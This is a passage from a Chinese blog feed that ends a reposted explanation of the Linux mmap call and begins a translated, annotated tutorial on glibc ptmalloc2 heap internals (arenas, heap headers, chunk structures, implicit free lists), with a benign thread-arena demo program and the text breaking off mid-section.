    <content type="html"><![CDATA[<p>mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><blockquote><p>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</p><p>int munmap(void* start,size_t length);</p></blockquote><p>mmap 必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>下面说一下内存映射的步骤:</p><ol><li>用open系统调用打开文件, 并返回描述符fd.</li><li>用mmap建立内存映射, 并返回映射首地址指针start.</li><li>对映射(文件)进行各种操作, 显示(printf), 修改(sprintf)</li><li>用munmap(void *start, size_t length)关闭内存映射.</li><li>用close系统调用关闭文件fd.</li></ol><h3 id="mmap函数的主要用途"><a href="#mmap函数的主要用途" class="headerlink" title="mmap函数的主要用途"></a>mmap函数的主要用途</h3><p>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I&#x2F;O读写，以获得较高的性能；</p><p>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</p><p>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p><h3 id="mmap函数说明"><a href="#mmap函数说明" class="headerlink" title="mmap函数说明"></a>mmap函数说明</h3><p><strong>参数start</strong></p><p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p><p><strong>参数length</strong></p><p>代表将文件中多大的部分映射到内存。</p><p><strong>参数prot</strong></p><p>映射区域的保护方式。可以为以下几种方式的组合：</p><p>PROT_EXEC 映射区域可被执行</p><p>PROT_READ 映射区域可被读取</p><p>PROT_WRITE 映射区域可被写入</p><p>PROT_NONE 映射区域不能存取</p><p><strong>参数flags</strong></p><p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p><p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。</p><p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p><p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p><p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p><p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p><p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p><p><strong>参数fd</strong></p><p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开&#x2F;dev&#x2F;zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p><p><strong>参数offset</strong></p><p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</p><p><strong>返回值</strong></p><p>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。</p><p><strong>错误代码</strong></p><p>EBADF  参数fd不是有效的文件描述词</p><p>EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用</p><p>MAP_SHARED则要有PROT_WRITE以及该文件要能写入。</p><p>EINVAL 参数start、length 或offset有一个不合法。</p><p>EAGAIN 文件被锁住，或是有太多内存被锁住。</p><p>ENOMEM 内存不足。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux堆内存管理深入分析（上）</title>
    <link href="/2023/11/09/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2023/11/09/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近年来，漏洞挖掘越来越火，各种漏洞挖掘、利用的分析文章层出不穷。从大方向来看，主要有基于栈溢出的漏洞利用和基于堆溢出的漏洞利用两种。国内关于栈溢出的资料相对较多，这里就不累述了，但是关于堆溢出的漏洞利用资料就很少了。鄙人以为主要是堆溢出漏洞的门槛较高，需要先吃透相应操作系统的堆内存管理机制，而这部分内容一直是一个难点。因此本系列文章主要从Linux系统堆内存管理机制出发，逐步介绍诸如基本堆溢出漏洞、基于unlink的堆溢出漏洞利用、double free、use-after-free等等常见的堆溢出漏洞利用技术。</p><p>前段时间偶然学习了这篇文章：</p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p><p>该文是我近段时间以来读到的最好文章之一，文章浅显易懂，条例清晰，作为初学者的我从中学到了很多linux堆内存管理相关的知识。但是估计由于篇幅的限制，该文对很多难点一带而过，造成部分知识点理解上的困难。因此我决定以该文为蓝本，结合其他参考资料和自己的理解，写一篇足够详细、完整的linux堆管理介绍文章，希冀能够给其他初学者献上微末之力。所以就内容来源而言，本文主要由两部分组成：一部分是翻译的上面提及的文章；另一部分是笔者结合其他参考资料和自己的理解添加的补充说明。鉴于笔者知识能力上的不足，如有问题欢迎各位大牛斧正！</p><p>同样的，鉴于篇幅过长，我将文章分成了上下两部分，上部分主要介绍堆内存管理中的一些基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。后半部分主要介绍glibc malloc为了提高堆内存分配和释放的效率，引入的显示链表技术，即binlist的概念和核心原理。其中使用到的源码在：</p><p><a href="https://github.com/sploitfun/lsploits/tree/master/glibc">https://github.com/sploitfun/lsploits/tree/master/glibc</a></p><p><a href="/others/files/malloc.c">malloc.c源码</a>。</p><h3 id="1、堆的介绍"><a href="#1、堆的介绍" class="headerlink" title="1、堆的介绍"></a>1、堆的介绍</h3><p>（1）堆在内存空间中不一定连续</p><p>（2）堆可由用户管理</p><p>常见的分配堆的方式：</p><ul><li>dlmalloc : general purpose allocator</li><li><font color=#f00>ptmalloc2 : glibc</font></li><li>jemalloc : FreeBSD 、Firefox and Android</li><li>tcmalloc : Google Chrome</li><li>libumem : Solaris</li></ul><p>本文主要学习介绍在linux glibc使用的ptmalloc2实现原理。</p><p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p><p>当然在linux平台*malloc本质上都是通过系统调用brk或者mmap实现的。关于这部分内容，<strong>一定要学习下面</strong>这篇文章：</p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p><p> 鉴于篇幅，本文就不加以详细说明了，只是为了方便后面对堆内存管理的理解，截取其中函数调用关系图：</p><p><img src="/images/2017-09-10/41u4qg499890.png" alt="函数调用关系图"></p><p>系统内存分布图：</p><p><img src="/images/2017-09-10/41u4qk4f6q40.png" alt="系统内存分布图"></p><h3 id="2、实验演示"><a href="#2、实验演示" class="headerlink" title="2、实验演示"></a>2、实验演示</h3><p>试想有如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Per thread arena example. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-type">void</span>* <span class="hljs-title function_">threadFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in thread 1\n&quot;</span>);<br>        getchar();<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">pthread_t</span> t1;<br>        <span class="hljs-type">void</span>* s;<br>        <span class="hljs-type">int</span> ret;<br>        <span class="hljs-type">char</span>* addr;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in main thread\n&quot;</span>);<br>        getchar();<br>        addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in main thread\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in main thread\n&quot;</span>);<br>        getchar();<br>        ret = pthread_create(&amp;t1, <span class="hljs-literal">NULL</span>, threadFunc, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread creation error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ret = pthread_join(t1, &amp;s);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread join error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们依次分析其各个阶段的堆内存分布状况。</p><ol><li><h4 id="Before-malloc-in-main-thread"><a href="#Before-malloc-in-main-thread" class="headerlink" title="Before malloc in main thread"></a>Before malloc in main thread</h4></li></ol><p>在程序调用malloc之前程序进程中是没有heap segment的，并且在创建在创建线程前，也是没有线程堆栈的。</p><ol start="2"><li><h4 id="After-malloc-in-main-thread"><a href="#After-malloc-in-main-thread" class="headerlink" title="After malloc in main thread"></a>After malloc in main thread</h4></li></ol><p>在主线程中调用malloc之后，就会发现系统给程序分配了堆栈，且这个堆栈刚好在数据段之上：</p><p><img src="/images/2017-09-10/v2-5721084ff178629469e27bc4f386bb09_b.png"></p><p>这就说明它是通过brk系统调用实现的。并且，还可以看出虽然我们只申请了1000字节的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以叫做main arena(每个arena中含有多个chunk，这些chunk以链表的形式加以组织)。由于132KB比1000字节大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。</p><ol start="3"><li><h4 id="After-free-in-main-thread"><a href="#After-free-in-main-thread" class="headerlink" title="After free in main thread"></a>After free in main thread</h4></li></ol><p>在主线程调用free之后：从内存布局可以看出程序的堆空间并没有被释放掉，原来调用free函数释放已经分配了的空间并非直接“返还”给系统，而是由glibc 的malloc库函数加以管理。它会将释放的chunk添加到main arenas的bin(这是一种用于存储同类型free chunk的双链表数据结构，后问会加以详细介绍)中。在这里，记录空闲空间的freelist数据结构称之为bins。之后当用户再次调用malloc申请堆空间的时候，glibc malloc会先尝试从bins中找到一个满足要求的chunk，如果没有才会向操作系统申请新的堆空间。如下图所示：</p><p><img src="/images/2017-09-10/v2-bf8b91202e341b07c0b7500dff5c0bb7_b.png"></p><ol start="4"><li><h4 id="Before-malloc-in-thread1"><a href="#Before-malloc-in-thread1" class="headerlink" title="Before malloc in thread1"></a>Before malloc in thread1</h4></li></ol><p>在thread1调用malloc之前：从输出结果可以看出thread1中并没有heap segment，但是此时thread1自己的栈空间已经分配完毕了：</p><p><img src="/images/2017-09-10/v2-b16ccca0d60949c38b4873463bed752c_b.png"></p><ol start="5"><li><h4 id="After-malloc-in-thread1"><a href="#After-malloc-in-thread1" class="headerlink" title="After malloc in thread1"></a>After malloc in thread1</h4></li></ol><p>在thread1调用malloc之后：从输出结果可以看出thread1的heap segment已经分配完毕了，同时从这个区域的起始地址可以看出，它并不是通过brk分配的，而是通过mmap分配，因为它的区域为b7500000-b7600000共1MB，并不是同程序的data segment相邻。同时，我们还能看出在这1MB中，根据内存属性分为了2部分：0xb7500000-0xb7521000共132KB大小的空间是可读可写属性；后面的是不可读写属性。原来，这里只有可读写的132KB空间才是thread1的堆空间，即thread1 arena。</p><p><img src="/images/2017-09-10/v2-4fdb53e52451ec6fa9f589427f6808b4_b.png"></p><ol start="6"><li><h4 id="在thread1调用free之后：同main-thread。"><a href="#在thread1调用free之后：同main-thread。" class="headerlink" title="在thread1调用free之后：同main thread。"></a>在thread1调用free之后：同main thread。</h4></li></ol><h3 id="3、Arena介绍"><a href="#3、Arena介绍" class="headerlink" title="3、Arena介绍"></a>3、Arena介绍</h3><h4 id="3-1-Arena数量限制"><a href="#3-1-Arena数量限制" class="headerlink" title="3.1 Arena数量限制"></a>3.1 Arena数量限制</h4><p>在第2章中我们提到main thread和thread1有自己独立的arena，那么是不是无论有多少个线程，每个线程都有自己独立的arena呢？答案是否定的。事实上，arena的个数是跟系统中处理器核心个数相关的，如下表所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">For</span> <span class="hljs-number">32</span> bit systems:<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">2</span> * number of cores + <span class="hljs-number">1</span>.<br><span class="hljs-attribute">For</span> <span class="hljs-number">64</span> bit systems:<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">8</span> * number of cores + <span class="hljs-number">1</span>.<br></code></pre></td></tr></table></figure><h4 id="3-2-多Arena的管理"><a href="#3-2-多Arena的管理" class="headerlink" title="3.2 多Arena的管理"></a>3.2 多Arena的管理</h4><p>假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1&#x3D; 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？</p><p>当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</p><p>当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</p><p>1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</p><p>2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</p><p>3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</p><p>这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</p><h3 id="4、堆管理介绍"><a href="#4、堆管理介绍" class="headerlink" title="4、堆管理介绍"></a>4、堆管理介绍</h3><h4 id="4-1-整体介绍"><a href="#4-1-整体介绍" class="headerlink" title="4.1 整体介绍"></a>4.1 整体介绍</h4><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p><ol><li>heap_info: 即Heap Header，因为一个<strong>thread arena</strong>（注意：不包含<strong>main thread</strong>）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。那么在什么情况下一个thread arena会包含多个heaps呢?在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><ol start="2"><li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍):</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  <span class="hljs-comment">/* #define INTERNAL_SIZE_T size_t */</span><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可能有很多读者会疑惑：该结构体里面并没有一个类似于data的字段来表示用户申请到的堆内存空间啊？且该结构体明确含有2个size_t类型的成员，4个指针，这不就意味着malloc_chunk的大小是固定的了么？那它又如何能够根据用户的请求分配不同大小的内存呢？要想回答清楚这个问题，需要我们完全理解整个glibc malloc的堆内存管理机制，同时，本文的主要目的之一就是希冀解释清楚这个概念，鉴于这部分内容较多，我将在后文的第5章加以详细介绍。</p><p><strong>NOTE:</strong></p><p>1.Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。</p><p>2.不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。</p><h4 id="4-2-heap-segment与arena关系"><a href="#4-2-heap-segment与arena关系" class="headerlink" title="4.2 heap segment与arena关系"></a>4.2 heap segment与arena关系</h4><p>首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。</p><p>下图是只有一个heap segment的main arena和thread arena的内存分布图：</p><p><img src="/images/2017-09-10/v2-cdc4b19aeb0c5bd01d24589c303f5d3b_b.png"></p><p>图4-1 只含一个heap segment的main arena与thread arena图</p><p>下图是一个thread arena中含有多个heap segments的情况：</p><p><img src="/images/2017-09-10/v2-d1ef4f85211061232d4397f4929e8e91_b.png"></p><p>图4-2 一个thread arena含有多个heap segments的内存分布图</p><p>从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。</p><h3 id="5、对chunk的理解"><a href="#5、对chunk的理解" class="headerlink" title="5、对chunk的理解"></a>5、对chunk的理解</h3><p>在glibc malloc中将整个堆内存空间分成了连续的、大小不一的chunk，即对于堆内存管理而言chunk就是最小操作单位。Chunk总共分为4类：</p><p>1)allocated chunk;</p><p> 2)free chunk; </p><p>3)top chunk;</p><p> 4)Last remainder chunk。</p><p>从本质上来说，所有类型的chunk都是内存中一块连续的区域，只是通过该区域中<strong>特定位置的某些标识符</strong>加以区分。为了简便，我们先将这4类chunk简化为2类：allocated chunk以及free chunk，前者表示已经分配给用户使用的chunk，后者表示未使用的chunk。</p><p>众所周知，无论是何种堆内存管理器，其完成的核心目的都是能够高效地分配和回收内存块(chunk)。因此，它需要设计好相关算法以及相应的数据结构，而数据结构往往是根据算法的需要加以改变的。既然是算法，那么算法肯定有一个优化改进的过程，所以本文将根据堆内存管理器的演变历程，逐步介绍在glibc malloc中chunk这种数据结构是如何设计出来的，以及这样设计的优缺点。</p><p>PS:鉴于时间和精力有限，后文介绍的演变历程并没有加以严格考证，笔者只是按照一些参考书籍、自己的理解以及便于文章内容安排做出的“善意的捏造”，如有错误，欢迎大家斧正！</p><h4 id="5-1-隐式链表技术"><a href="#5-1-隐式链表技术" class="headerlink" title="5.1 隐式链表技术"></a>5.1 隐式链表技术</h4><p>前文说过，任何堆内存管理器都是以chunk为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为chunk的一部分嵌入到chunk内部，典型的设计如下所示：</p><p><img src="/images/2017-09-10/v2-7e0628272e1bf28e38bc99849774c0c9_b.png"></p><p>图5-1 简单的allocated chunk格式</p><p><img src="/images/2017-09-10/v2-f092bde1862553448676a9adc97d6de3_b.png"></p><p>图5-2 简单的free chunk格式</p><p><font color=#f00>堆内存中要求每个chunk的大小必须为8的整数倍，因此chunk size的后3位是无效的，为了充分利用内存，堆管理器将这3个比特位用作chunk的标志位，典型的就是将第0比特位用于标记该chunk是否已经被分配。</font>这样的设计很巧妙，因为我们只要获取了一个指向chunk size的指针，就能知道该chunk的大小，即确定了此chunk的边界，且利用chunk size的第0比特位还能知道该chunk是否已经分配，这样就成功地将各个chunk区分开来。注意在allocated chunk中padding部分主要是用于地址对齐的(也可用于对付外部碎片)，即让整个chunk的大小为8的整数倍。</p><p>通过上面的设计，我们就能将整个堆内存组织成一个连续的已分配或未分配chunk序列:</p><p><img src="/images/2017-09-10/v2-df2d5bd535e5a00382d4647c0a900109_b.png"></p><p>图5-3 简单的chunk序列</p><p>上面的这种结构就叫做隐式链表。该链表隐式地由每个chunk的size字段链接起来，在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的chunk，分析每个chunk的size字段，进而找到合适的chunk。</p><p>细心的读者可能发现：这种隐式链表效率其实是相当低的，特别是在内存回收方面，它难以进行相邻多个free chunk的合并操作。我们知道，如果只对free chunk进行分割，而不进行合并的话，就会产生大量小的、无法继续使用的内部碎片，直至整个内存消耗殆尽。因此堆内存管理器设计了带边界标记的chunk合并技术。</p><h5 id="1-带边界标记的合并技术"><a href="#1-带边界标记的合并技术" class="headerlink" title="1.带边界标记的合并技术"></a>1.带边界标记的合并技术</h5><p>试想如下场景：假设我们要释放的chunk为P，它紧邻的前一个chunk为FD，紧邻的后一个chunk为BK，且BK与FD都为free 